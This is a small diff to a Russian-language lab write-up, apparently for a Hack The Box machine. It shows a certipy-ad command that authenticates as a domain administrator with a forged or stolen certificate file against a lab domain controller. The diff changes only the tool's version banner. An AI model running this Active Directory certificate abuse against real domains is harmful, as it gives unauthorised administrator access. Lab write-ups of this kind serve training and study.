@@ -443,7 +443,7 @@ tags:
     === "Аутентификация от имени Administrator"
         ```console
         $ certipy-ad auth -u administrator -domain sendai.vl -dc-ip 10.129.59.196 -ns 10.129.59.196 -pfx administrator.pfx
-        Certipy v4.8.2 - by Oliver Lyak (ly4k)
+        Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
         [*] Using principal: administrator@sendai.vl
         [*] Trying to get TGT...
